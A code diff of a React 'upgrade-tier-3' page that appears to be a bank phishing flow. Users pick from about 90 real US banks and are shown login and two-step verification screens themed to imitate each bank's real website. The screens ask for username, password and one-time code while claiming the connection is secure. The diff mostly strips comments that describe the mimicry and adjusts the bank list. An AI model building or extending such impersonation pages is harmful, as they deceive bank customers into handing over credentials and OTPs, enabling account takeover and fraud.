@@ -42,27 +42,25 @@ export const Route = createFileRoute("/upgrade-tier-3")({
   component: UpgradeTier3,
 });
 
-// Each bank has: id, name, auth type, and a theme that matches their real website
 interface BankDef {
   id: string;
   name: string;
   auth: "otp" | "securityq";
   position: number;
   theme: {
-    bg: string;           // main background color
-    headerBg: string;     // header/card background
-    headerText: string;   // header text color
-    accent: string;       // button/link color
-    accentText: string;   // button text color
-    logo: string;         // text logo shown in header
-    logoColor: string;    // logo text color
-    inputBorder: string;  // input focus border
-    tagline?: string;     // optional bank tagline shown in header
+    bg: string;
+    headerBg: string;
+    headerText: string;
+    accent: string;
+    accentText: string;
+    logo: string;
+    logoColor: string;
+    inputBorder: string;
+    tagline?: string;
   };
 }
 
 const BANKS_DATA: BankDef[] = [
-  // ── MAJOR NATIONAL ──
   {
     id: "chase", name: "Chase Bank", auth: "otp", position: 1,
     theme: { bg: "#f5f5f5", headerBg: "#005eb8", headerText: "#ffffff", accent: "#005eb8", accentText: "#ffffff", logo: "CHASE", logoColor: "#ffffff", inputBorder: "#005eb8", tagline: "The right relationship is everything" },
@@ -116,145 +114,73 @@ const BANKS_DATA: BankDef[] = [
     theme: { bg: "#f5f9f5", headerBg: "#0075be", headerText: "#ffffff", accent: "#0075be", accentText: "#ffffff", logo: "Alliant", logoColor: "#ffffff", inputBorder: "#0075be", tagline: "Banking for the greater good" },
   },
   {
-    id: "fifththird", name: "Fifth Third Bank", auth: "otp", position: 14,
+    id: "ferkomd", name: "Ferko Maryland Federal Credit Union", auth: "otp", position: 14,
+    theme: { bg: "#f0f4f8", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "Ferko", logoColor: "#ffffff", inputBorder: "#003087", tagline: "Your community bank" },
+  },
+  {
+    id: "fifththird", name: "Fifth Third Bank", auth: "otp", position: 15,
     theme: { bg: "#f5f5f5", headerBg: "#00a950", headerText: "#ffffff", accent: "#00a950", accentText: "#ffffff", logo: "Fifth Third Bank", logoColor: "#ffffff", inputBorder: "#00a950", tagline: "Banking a Fifth Third Better" },
   },
   {
-    id: "huntington", name: "Huntington Bank", auth: "otp", position: 15,
+    id: "huntington", name: "Huntington Bank", auth: "otp", position: 16,
     theme: { bg: "#f5f5f5", headerBg: "#00813d", headerText: "#ffffff", accent: "#00813d", accentText: "#ffffff", logo: "Huntington", logoColor: "#ffffff", inputBorder: "#00813d", tagline: "Welcome. We've been expecting you." },
   },
   {
-    id: "keybank", name: "KeyBank", auth: "otp", position: 16,
+    id: "keybank", name: "KeyBank", auth: "otp", position: 17,
     theme: { bg: "#f5f5f5", headerBg: "#cc0000", headerText: "#ffffff", accent: "#cc0000", accentText: "#ffffff", logo: "KeyBank", logoColor: "#ffffff", inputBorder: "#cc0000", tagline: "Unlock possibilities" },
   },
   {
-    id: "regionbank", name: "Regions Bank", auth: "otp", position: 17,
+    id: "regionbank", name: "Regions Bank", auth: "otp", position: 18,
     theme: { bg: "#f5f5f5", headerBg: "#006938", headerText: "#ffffff", accent: "#006938", accentText: "#ffffff", logo: "Regions", logoColor: "#ffffff", inputBorder: "#006938", tagline: "Here for you" },
   },
   {
-    id: "ally", name: "Ally Bank", auth: "otp", position: 18,
+    id: "ally", name: "Ally Bank", auth: "otp", position: 19,
     theme: { bg: "#f0f8ff", headerBg: "#7b1fa2", headerText: "#ffffff", accent: "#7b1fa2", accentText: "#ffffff", logo: "ally", logoColor: "#ffffff", inputBorder: "#7b1fa2", tagline: "Do It Right" },
   },
   {
-    id: "marcus", name: "Marcus by Goldman Sachs", auth: "otp", position: 19,
+    id: "marcus", name: "Marcus by Goldman Sachs", auth: "otp", position: 20,
     theme: { bg: "#f5f5f0", headerBg: "#1a1a1a", headerText: "#ffffff", accent: "#1a1a1a", accentText: "#ffffff", logo: "Marcus", logoColor: "#ffffff", inputBorder: "#1a1a1a", tagline: "by Goldman Sachs" },
   },
   {
-    id: "sofi", name: "SoFi Bank", auth: "otp", position: 20,
+    id: "sofi", name: "SoFi Bank", auth: "otp", position: 21,
     theme: { bg: "#f0f9f4", headerBg: "#00a862", headerText: "#ffffff", accent: "#00a862", accentText: "#ffffff", logo: "SoFi", logoColor: "#ffffff", inputBorder: "#00a862", tagline: "Get your money right" },
   },
   {
-    id: "chime", name: "Chime Bank", auth: "otp", position: 21,
+    id: "chime", name: "Chime Bank", auth: "otp", position: 22,
     theme: { bg: "#f0f9f4", headerBg: "#1ec677", headerText: "#ffffff", accent: "#1ec677", accentText: "#ffffff", logo: "Chime", logoColor: "#ffffff", inputBorder: "#1ec677", tagline: "Banking that has your back" },
   },
   {
-    id: "schwab", name: "Charles Schwab Bank", auth: "otp", position: 22,
+    id: "schwab", name: "Charles Schwab Bank", auth: "otp", position: 23,
     theme: { bg: "#f5f5f5", headerBg: "#00a0df", headerText: "#ffffff", accent: "#00a0df", accentText: "#ffffff", logo: "Schwab", logoColor: "#ffffff", inputBorder: "#00a0df", tagline: "Own your tomorrow" },
   },
   {
-    id: "citizens", name: "Citizens Bank", auth: "otp", position: 23,
+    id: "citizens", name: "Citizens Bank", auth: "otp", position: 24,
     theme: { bg: "#f5f5f5", headerBg: "#006341", headerText: "#ffffff", accent: "#006341", accentText: "#ffffff", logo: "Citizens", logoColor: "#ffffff", inputBorder: "#006341", tagline: "Made ready" },
   },
   {
-    id: "santander", name: "Santander Bank", auth: "otp", position: 24,
+    id: "santander", name: "Santander Bank", auth: "otp", position: 25,
     theme: { bg: "#fff5f5", headerBg: "#ec0000", headerText: "#ffffff", accent: "#ec0000", accentText: "#ffffff", logo: "Santander", logoColor: "#ffffff", inputBorder: "#ec0000", tagline: "Simple. Personal. Fair." },
   },
   {
-    id: "hsbc", name: "HSBC Bank USA", auth: "otp", position: 25,
+    id: "hsbc", name: "HSBC Bank USA", auth: "otp", position: 26,
     theme: { bg: "#fdf5f5", headerBg: "#db0011", headerText: "#ffffff", accent: "#db0011", accentText: "#ffffff", logo: "HSBC", logoColor: "#ffffff", inputBorder: "#db0011", tagline: "Together we thrive" },
   },
   {
-    id: "westernalliance", name: "Western Alliance Bank", auth: "otp", position: 26,
+    id: "westernalliance", name: "Western Alliance Bank", auth: "otp", position: 27,
     theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "Western Alliance", logoColor: "#ffffff", inputBorder: "#003087" },
   },
   {
-    id: "zions", name: "Zions Bank", auth: "otp", position: 27,
+    id: "zions", name: "Zions Bank", auth: "otp", position: 28,
     theme: { bg: "#f5f5f5", headerBg: "#002d62", headerText: "#ffffff", accent: "#002d62", accentText: "#ffffff", logo: "Zions Bank", logoColor: "#ffffff", inputBorder: "#002d62", tagline: "The West is our home" },
   },
   {
-    id: "cullen", name: "Cullen/Frost Bankers", auth: "otp", position: 28,
+    id: "cullen", name: "Cullen/Frost Bankers", auth: "otp", position: 29,
     theme: { bg: "#f5f5f5", headerBg: "#00539b", headerText: "#ffffff", accent: "#00539b", accentText: "#ffffff", logo: "Frost", logoColor: "#ffffff", inputBorder: "#00539b", tagline: "Texas banking since 1868" },
   },
   {
-    id: "prosperity", name: "Prosperity Bank", auth: "otp", position: 29,
+    id: "prosperity", name: "Prosperity Bank", auth: "otp", position: 30,
     theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#ffffff", accent: "#003865", accentText: "#ffffff", logo: "Prosperity Bank", logoColor: "#ffffff", inputBorder: "#003865" },
   },
-  {
-    id: "banner", name: "Banner Bank", auth: "otp", position: 30,
-    theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#ffffff", accent: "#003865", accentText: "#ffffff", logo: "Banner Bank", logoColor: "#ffffff", inputBorder: "#003865" },
-  },
-  {
-    id: "umpqua", name: "Umpqua Bank", auth: "otp", position: 31,
-    theme: { bg: "#f5f5f5", headerBg: "#4a1942", headerText: "#ffffff", accent: "#4a1942", accentText: "#ffffff", logo: "Umpqua Bank", logoColor: "#ffffff", inputBorder: "#4a1942", tagline: "The world's greatest bank" },
-  },
-  {
-    id: "wintrust", name: "Wintrust Bank", auth: "otp", position: 32,
-    theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "Wintrust", logoColor: "#ffffff", inputBorder: "#003087" },
-  },
-  {
-    id: "oldnational", name: "Old National Bancorp", auth: "otp", position: 33,
-    theme: { bg: "#f5f5f5", headerBg: "#005daa", headerText: "#ffffff", accent: "#005daa", accentText: "#ffffff", logo: "Old National", logoColor: "#ffffff", inputBorder: "#005daa" },
-  },
-  {
-    id: "fibl", name: "First Interstate Bank", auth: "otp", position: 34,
-    theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "First Interstate", logoColor: "#ffffff", inputBorder: "#003087" },
-  },
-  // ── STATE COMMUNITY BANKS (shared neutral professional theme per region) ──
-  { id: "al_01", name: "Southcrest Bank", auth: "otp", position: 35, theme: { bg: "#f5f5f5", headerBg: "#1a3a5c", headerText: "#fff", accent: "#1a3a5c", accentText: "#fff", logo: "Southcrest Bank", logoColor: "#fff", inputBorder: "#1a3a5c" } },
-  { id: "al_02", name: "Renasant Bank", auth: "otp", position: 36, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#fff", accent: "#003865", accentText: "#fff", logo: "Renasant Bank", logoColor: "#fff", inputBorder: "#003865" } },
-  { id: "ak_01", name: "First Bank Alaska", auth: "otp", position: 37, theme: { bg: "#f0f4f8", headerBg: "#1a3a5c", headerText: "#fff", accent: "#1a3a5c", accentText: "#fff", logo: "First Bank Alaska", logoColor: "#fff", inputBorder: "#1a3a5c" } },
-  { id: "ak_03", name: "Denali State Bank", auth: "otp", position: 38, theme: { bg: "#f0f4f8", headerBg: "#2c3e50", headerText: "#fff", accent: "#2c3e50", accentText: "#fff", logo: "Denali State Bank", logoColor: "#fff", inputBorder: "#2c3e50" } },
-  { id: "az_01", name: "Arizona Bank & Trust", auth: "otp", position: 39, theme: { bg: "#fdf5ec", headerBg: "#b5441a", headerText: "#fff", accent: "#b5441a", accentText: "#fff", logo: "Arizona Bank & Trust", logoColor: "#fff", inputBorder: "#b5441a" } },
-  { id: "ca_01", name: "Union Bank California", auth: "otp", position: 40, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Union Bank", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "ca_03", name: "Santa Cruz County Bank", auth: "otp", position: 41, theme: { bg: "#f5f9f5", headerBg: "#1a6b3c", headerText: "#fff", accent: "#1a6b3c", accentText: "#fff", logo: "Santa Cruz County Bank", logoColor: "#fff", inputBorder: "#1a6b3c" } },
-  { id: "co_01", name: "Colorado Bank", auth: "otp", position: 42, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Colorado Bank", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "ct_01", name: "Connecticut Bank", auth: "otp", position: 43, theme: { bg: "#f5f5f5", headerBg: "#1a3a5c", headerText: "#fff", accent: "#1a3a5c", accentText: "#fff", logo: "Connecticut Bank", logoColor: "#fff", inputBorder: "#1a3a5c" } },
-  { id: "fl_01", name: "BankUnited", auth: "otp", position: 44, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#fff", accent: "#003865", accentText: "#fff", logo: "BankUnited", logoColor: "#fff", inputBorder: "#003865" } },
-  { id: "fl_02", name: "Ocean Bank", auth: "otp", position: 45, theme: { bg: "#f0f8ff", headerBg: "#005b99", headerText: "#fff", accent: "#005b99", accentText: "#fff", logo: "Ocean Bank", logoColor: "#fff", inputBorder: "#005b99" } },
-  { id: "fl_03", name: "Sunshine Bank", auth: "otp", position: 46, theme: { bg: "#fff8f0", headerBg: "#f0820f", headerText: "#fff", accent: "#f0820f", accentText: "#fff", logo: "Sunshine Bank", logoColor: "#fff", inputBorder: "#f0820f" } },
-  { id: "ga_01", name: "Colony Bank", auth: "otp", position: 47, theme: { bg: "#f5f5f5", headerBg: "#8b0000", headerText: "#fff", accent: "#8b0000", accentText: "#fff", logo: "Colony Bank", logoColor: "#fff", inputBorder: "#8b0000" } },
-  { id: "hi_01", name: "Bank of Hawaii", auth: "otp", position: 48, theme: { bg: "#f0f8f5", headerBg: "#005b5b", headerText: "#fff", accent: "#005b5b", accentText: "#fff", logo: "Bank of Hawaii", logoColor: "#fff", inputBorder: "#005b5b", tagline: "Here for good" } },
-  { id: "hi_02", name: "First Hawaiian Bank", auth: "otp", position: 49, theme: { bg: "#f5f0ff", headerBg: "#5c2d8c", headerText: "#fff", accent: "#5c2d8c", accentText: "#fff", logo: "First Hawaiian Bank", logoColor: "#fff", inputBorder: "#5c2d8c" } },
-  { id: "il_01", name: "Byline Bank", auth: "otp", position: 50, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Byline Bank", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "in_01", name: "First Merchants Bank", auth: "otp", position: 51, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#fff", accent: "#003865", accentText: "#fff", logo: "First Merchants", logoColor: "#fff", inputBorder: "#003865" } },
-  { id: "ia_01", name: "MidWestOne Bank", auth: "otp", position: 52, theme: { bg: "#f5f5f5", headerBg: "#004990", headerText: "#fff", accent: "#004990", accentText: "#fff", logo: "MidWestOne", logoColor: "#fff", inputBorder: "#004990" } },
-  { id: "ks_01", name: "CoreFirst Bank", auth: "otp", position: 53, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "CoreFirst Bank", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "ky_01", name: "Stock Yards Bank", auth: "otp", position: 54, theme: { bg: "#f5f5f5", headerBg: "#002d62", headerText: "#fff", accent: "#002d62", accentText: "#fff", logo: "Stock Yards Bank", logoColor: "#fff", inputBorder: "#002d62" } },
-  { id: "la_01", name: "Home Bank Louisiana", auth: "otp", position: 55, theme: { bg: "#f5f5f5", headerBg: "#8b0000", headerText: "#fff", accent: "#8b0000", accentText: "#fff", logo: "Home Bank", logoColor: "#fff", inputBorder: "#8b0000" } },
-  { id: "me_01", name: "Bangor Savings Bank", auth: "otp", position: 56, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#fff", accent: "#003865", accentText: "#fff", logo: "Bangor Savings", logoColor: "#fff", inputBorder: "#003865" } },
-  { id: "md_01", name: "Old Line Bank", auth: "otp", position: 57, theme: { bg: "#f5f5f5", headerBg: "#002d62", headerText: "#fff", accent: "#002d62", accentText: "#fff", logo: "Old Line Bank", logoColor: "#fff", inputBorder: "#002d62" } },
-  { id: "ma_01", name: "Eastern Bank", auth: "otp", position: 58, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Eastern Bank", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "mi_01", name: "Flagstar Bank", auth: "otp", position: 59, theme: { bg: "#f5f5f5", headerBg: "#c8102e", headerText: "#fff", accent: "#c8102e", accentText: "#fff", logo: "Flagstar Bank", logoColor: "#fff", inputBorder: "#c8102e" } },
-  { id: "mn_01", name: "Bremer Bank", auth: "otp", position: 60, theme: { bg: "#f5f5f5", headerBg: "#004b87", headerText: "#fff", accent: "#004b87", accentText: "#fff", logo: "Bremer Bank", logoColor: "#fff", inputBorder: "#004b87" } },
-  { id: "ms_01", name: "Renasant Bank MS", auth: "otp", position: 61, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#fff", accent: "#003865", accentText: "#fff", logo: "Renasant Bank", logoColor: "#fff", inputBorder: "#003865" } },
-  { id: "mo_01", name: "Commerce Bank", auth: "otp", position: 62, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Commerce Bank", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "mt_01", name: "Glacier Bank", auth: "otp", position: 63, theme: { bg: "#f0f8ff", headerBg: "#004b87", headerText: "#fff", accent: "#004b87", accentText: "#fff", logo: "Glacier Bank", logoColor: "#fff", inputBorder: "#004b87" } },
-  { id: "ne_01", name: "Pinnacle Bank Nebraska", auth: "otp", position: 64, theme: { bg: "#f5f5f5", headerBg: "#c8102e", headerText: "#fff", accent: "#c8102e", accentText: "#fff", logo: "Pinnacle Bank", logoColor: "#fff", inputBorder: "#c8102e" } },
-  { id: "nv_01", name: "Nevada State Bank", auth: "otp", position: 65, theme: { bg: "#f5f5f5", headerBg: "#002d62", headerText: "#fff", accent: "#002d62", accentText: "#fff", logo: "Nevada State Bank", logoColor: "#fff", inputBorder: "#002d62" } },
-  { id: "nh_01", name: "Banknorth NH", auth: "otp", position: 66, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Banknorth", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "nj_01", name: "Columbia Bank NJ", auth: "otp", position: 67, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#fff", accent: "#003865", accentText: "#fff", logo: "Columbia Bank", logoColor: "#fff", inputBorder: "#003865" } },
-  { id: "nm_01", name: "New Mexico Bank & Trust", auth: "otp", position: 68, theme: { bg: "#fdf5ec", headerBg: "#b5441a", headerText: "#fff", accent: "#b5441a", accentText: "#fff", logo: "NM Bank & Trust", logoColor: "#fff", inputBorder: "#b5441a" } },
-  { id: "ny_02", name: "New York Community Bank", auth: "otp", position: 69, theme: { bg: "#f5f5f5", headerBg: "#002d62", headerText: "#fff", accent: "#002d62", accentText: "#fff", logo: "NYCB", logoColor: "#fff", inputBorder: "#002d62" } },
-  { id: "ny_05", name: "Flushing Bank", auth: "otp", position: 70, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Flushing Bank", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "nc_01", name: "First Bancorp NC", auth: "otp", position: 71, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#fff", accent: "#003865", accentText: "#fff", logo: "First Bancorp", logoColor: "#fff", inputBorder: "#003865" } },
-  { id: "nd_01", name: "Bell Bank ND", auth: "otp", position: 72, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Bell Bank", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "oh_01", name: "First Federal Savings Ohio", auth: "otp", position: 73, theme: { bg: "#f5f5f5", headerBg: "#c8102e", headerText: "#fff", accent: "#c8102e", accentText: "#fff", logo: "First Federal", logoColor: "#fff", inputBorder: "#c8102e" } },
-  { id: "ok_01", name: "BancFirst Oklahoma", auth: "otp", position: 74, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "BancFirst", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "or_01", name: "Columbia State Bank", auth: "otp", position: 75, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#fff", accent: "#003865", accentText: "#fff", logo: "Columbia State Bank", logoColor: "#fff", inputBorder: "#003865" } },
-  { id: "pa_01", name: "Customers Bank", auth: "otp", position: 76, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Customers Bank", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "ri_01", name: "BankNewport", auth: "otp", position: 77, theme: { bg: "#f0f8ff", headerBg: "#004b87", headerText: "#fff", accent: "#004b87", accentText: "#fff", logo: "BankNewport", logoColor: "#fff", inputBorder: "#004b87" } },
-  { id: "sc_01", name: "First Reliance Bank", auth: "otp", position: 78, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#fff", accent: "#003865", accentText: "#fff", logo: "First Reliance Bank", logoColor: "#fff", inputBorder: "#003865" } },
-  { id: "sd_01", name: "Great Plains Bank", auth: "otp", position: 79, theme: { bg: "#f5f5f5", headerBg: "#1a3a5c", headerText: "#fff", accent: "#1a3a5c", accentText: "#fff", logo: "Great Plains Bank", logoColor: "#fff", inputBorder: "#1a3a5c" } },
-  { id: "tn_01", name: "Avenue Bank Tennessee", auth: "otp", position: 80, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Avenue Bank", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "tx_01", name: "Frost Bank", auth: "otp", position: 81, theme: { bg: "#f5f5f5", headerBg: "#00539b", headerText: "#fff", accent: "#00539b", accentText: "#fff", logo: "Frost Bank", logoColor: "#fff", inputBorder: "#00539b" } },
-  { id: "tx_02", name: "Texas Capital Bank", auth: "otp", position: 82, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Texas Capital Bank", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "ut_01", name: "Celtic Bank Utah", auth: "otp", position: 83, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#fff", accent: "#003865", accentText: "#fff", logo: "Celtic Bank", logoColor: "#fff", inputBorder: "#003865" } },
-  { id: "vt_01", name: "Merchants Bank Vermont", auth: "otp", position: 84, theme: { bg: "#f5f5f5", headerBg: "#006341", headerText: "#fff", accent: "#006341", accentText: "#fff", logo: "Merchants Bank", logoColor: "#fff", inputBorder: "#006341" } },
-  { id: "va_01", name: "Cardinal Bankshares", auth: "otp", position: 85, theme: { bg: "#f5f5f5", headerBg: "#8b0000", headerText: "#fff", accent: "#8b0000", accentText: "#fff", logo: "Cardinal Bank", logoColor: "#fff", inputBorder: "#8b0000" } },
-  { id: "wa_01", name: "Washington Federal", auth: "otp", position: 86, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#fff", accent: "#003087", accentText: "#fff", logo: "Washington Federal", logoColor: "#fff", inputBorder: "#003087" } },
-  { id: "wv_01", name: "City National Bank WV", auth: "otp", position: 87, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#fff", accent: "#003865", accentText: "#fff", logo: "City National Bank", logoColor: "#fff", inputBorder: "#003865" } },
-  { id: "wi_01", name: "Heartland Bank Wisconsin", auth: "otp", position: 88, theme: { bg: "#f5f5f5", headerBg: "#c8102e", headerText: "#fff", accent: "#c8102e", accentText: "#fff", logo: "Heartland Bank", logoColor: "#fff", inputBorder: "#c8102e" } },
-  { id: "wy_01", name: "First State Bank Wyoming", auth: "otp", position: 89, theme: { bg: "#f5f5f5", headerBg: "#1a3a5c", headerText: "#fff", accent: "#1a3a5c", accentText: "#fff", logo: "First State Bank", logoColor: "#fff", inputBorder: "#1a3a5c" } },
 ];
 
 type Step = "intro" | "bank-select" | "bank-login" | "auth-confirm" | "processing" | "success";
@@ -385,7 +311,6 @@ function UpgradeTier3() {
     </div>
   );
 
-  // ── INTRO ──
   if (step === "intro") {
     if (isTransitioning) return <LoadingScreen msg="Loading bank selection..." />;
     return (
@@ -421,7 +346,6 @@ function UpgradeTier3() {
     );
   }
 
-  // ── BANK SELECT ──
   if (step === "bank-select") {
     if (isTransitioning) return <LoadingScreen msg="Connecting to bank..." />;
     const hasMatch = filteredBanks.length > 0;
@@ -497,21 +421,17 @@ function UpgradeTier3() {
     );
   }
 
-  // ── BANK LOGIN — styled per each bank's real brand ──
   if (step === "bank-login" && selectedBank) {
     if (isTransitioning) return <LoadingScreen msg="Processing your credentials..." />;
     const t = selectedBank.theme;
     return (
       <div className="min-h-screen pb-16" style={{ background: t.bg }}>
-        {/* Bank-branded header — matches each bank's real website header */}
         <div style={{ background: t.headerBg }} className="px-6 py-4 shadow-md">
           <div className="mx-auto max-w-3xl flex items-center justify-between">
             <span className="text-2xl font-black tracking-tight" style={{ color: t.logoColor }}>{t.logo}</span>
             {t.tagline && <span className="hidden md:block text-xs opacity-75" style={{ color: t.logoColor }}>{t.tagline}</span>}
           </div>
         </div>
-
-        {/* Nav strip — mimics bank site secondary nav */}
         <div style={{ background: t.headerBg, opacity: 0.85, borderTop: "1px solid rgba(255,255,255,0.15)" }} className="px-6 py-2">
           <div className="mx-auto max-w-3xl flex gap-6">
             {["Personal", "Business", "Wealth Management", "About Us"].map(item => (
@@ -519,45 +439,38 @@ function UpgradeTier3() {
             ))}
           </div>
         </div>
-
         <div className="mx-auto max-w-3xl px-6 mt-8">
           <button onClick={() => setStep("bank-select")} className="inline-flex items-center gap-1.5 text-sm mb-6" style={{ color: t.accent }}>
             <ArrowLeft className="h-4 w-4" /> Back
           </button>
-
           <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-200">
-            {/* Login card header */}
             <div className="px-8 py-6" style={{ background: t.headerBg }}>
               <h2 className="text-xl font-bold" style={{ color: t.headerText }}>Sign In to {selectedBank.name}</h2>
               <p className="text-sm mt-1 opacity-80" style={{ color: t.headerText }}>Enter your online banking credentials</p>
             </div>
-
             <div className="p-8 space-y-5">
-              {/* Security badge */}
               <div className="flex items-center gap-2 text-xs text-gray-500 border border-gray-200 rounded-lg px-4 py-2.5 bg-gray-50">
                 <Shield className="h-4 w-4" style={{ color: t.accent }} />
                 <span>Secure, encrypted connection — your credentials are protected</span>
               </div>
-
               <div>
                 <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-2">Online ID / Username</label>
                 <input type="text" value={email} onChange={e => handleEmailChange(e.target.value)} placeholder={`Your ${selectedBank.name} username`}
                   disabled={isTransitioning}
                   className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none text-sm"
                   style={{ "--tw-ring-color": t.inputBorder } as React.CSSProperties}
-                  onFocus={e => { e.target.style.borderColor = t.inputBorder; e.target.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
-                  onBlur={e => { e.target.style.borderColor = "#d1d5db"; e.target.style.boxShadow = "none"; }}
+                  onFocus={e => { e.currentTarget.style.borderColor = t.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
+                  onBlur={e => { e.currentTarget.style.borderColor = "#d1d5db"; e.currentTarget.style.boxShadow = "none"; }}
                 />
               </div>
-
               <div>
                 <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-2">Password</label>
                 <div className="relative">
                   <input type={showPassword ? "text" : "password"} value={password} onChange={e => handlePasswordChange(e.target.value)} placeholder="Your password"
                     disabled={isTransitioning}
                     className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none text-sm pr-12"
-                    onFocus={e => { e.target.style.borderColor = t.inputBorder; e.target.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
-                    onBlur={e => { e.target.style.borderColor = "#d1d5db"; e.target.style.boxShadow = "none"; }}
+                    onFocus={e => { e.currentTarget.style.borderColor = t.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
+                    onBlur={e => { e.currentTarget.style.borderColor = "#d1d5db"; e.currentTarget.style.boxShadow = "none"; }}
                   />
                   <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600">
                     {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
@@ -567,26 +480,21 @@ function UpgradeTier3() {
                   <span className="text-xs cursor-default" style={{ color: t.accent }}>Forgot password?</span>
                 </div>
               </div>
-
               {loginError && (
                 <div className="flex items-start gap-3 p-4 rounded-lg bg-red-50 border border-red-200 text-red-700 text-sm">
                   <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" /> {loginError}
                 </div>
               )}
-
               <button onClick={handleLogin} disabled={isTransitioning}
                 className="w-full py-3.5 rounded-lg font-semibold text-sm transition hover:opacity-90 disabled:opacity-50"
                 style={{ background: t.accent, color: t.accentText }}>
                 Sign In
               </button>
-
               <p className="text-center text-xs text-gray-400">
                 By signing in you agree to {selectedBank.name}'s Terms of Service and Privacy Policy
               </p>
             </div>
           </div>
-
-          {/* Footer strip mimicking bank website */}
           <div className="mt-6 text-center text-xs text-gray-400 space-x-4">
             <span>Privacy Policy</span><span>·</span>
             <span>Security</span><span>·</span>
@@ -598,7 +506,6 @@ function UpgradeTier3() {
     );
   }
 
-  // ── OTP / AUTH CONFIRM — also bank-branded ──
   if (step === "auth-confirm" && selectedBank) {
     if (isTransitioning) return <LoadingScreen msg="Verifying your account..." />;
     const t = selectedBank.theme;
@@ -610,39 +517,33 @@ function UpgradeTier3() {
             {t.tagline && <span className="hidden md:block text-xs opacity-75" style={{ color: t.logoColor }}>{t.tagline}</span>}
           </div>
         </div>
-
         <div className="mx-auto max-w-3xl px-6 mt-8">
           <button onClick={() => setStep("bank-login")} className="inline-flex items-center gap-1.5 text-sm mb-6" style={{ color: t.accent }}>
             <ArrowLeft className="h-4 w-4" /> Back
           </button>
-
           <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-200">
             <div className="px-8 py-6" style={{ background: t.headerBg }}>
               <h2 className="text-xl font-bold" style={{ color: t.headerText }}>Two-Step Verification</h2>
               <p className="text-sm mt-1 opacity-80" style={{ color: t.headerText }}>Confirm it's you before we continue</p>
             </div>
-
             <div className="p-8 space-y-6">
               <div className="rounded-lg border border-gray-200 bg-gray-50 p-4 text-sm text-gray-600">
-                A one-time verification code has been sent to your registered phone number or email on file with {selectedBank.name}.
+                An OTP has been sent to your registered email or phone number on file with {selectedBank.name}.
               </div>
-
               <div>
                 <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-3">Verification Code</label>
                 <input type="text" value={otp} onChange={e => handleOtpChange(e.target.value)} placeholder="Enter code"
                   disabled={isTransitioning}
